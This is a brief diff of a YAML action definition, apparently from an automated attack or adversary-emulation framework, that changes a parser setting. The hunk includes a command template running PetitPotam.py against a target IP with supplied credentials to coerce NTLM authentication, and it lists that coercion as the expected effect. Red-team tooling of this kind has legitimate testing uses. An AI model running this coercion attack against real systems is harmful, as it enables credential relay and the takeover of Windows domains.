@@ -12,7 +12,7 @@ parameters:
   password: from_cred.password
 command_template: python3 PetitPotam.py {listener_ip} {target_ip} -u '{username}'
   -p '{password}'
-parser: null
+parser: generic_parser
 expected_effects:
 - ntlm_auth_coerced
 falsifier:
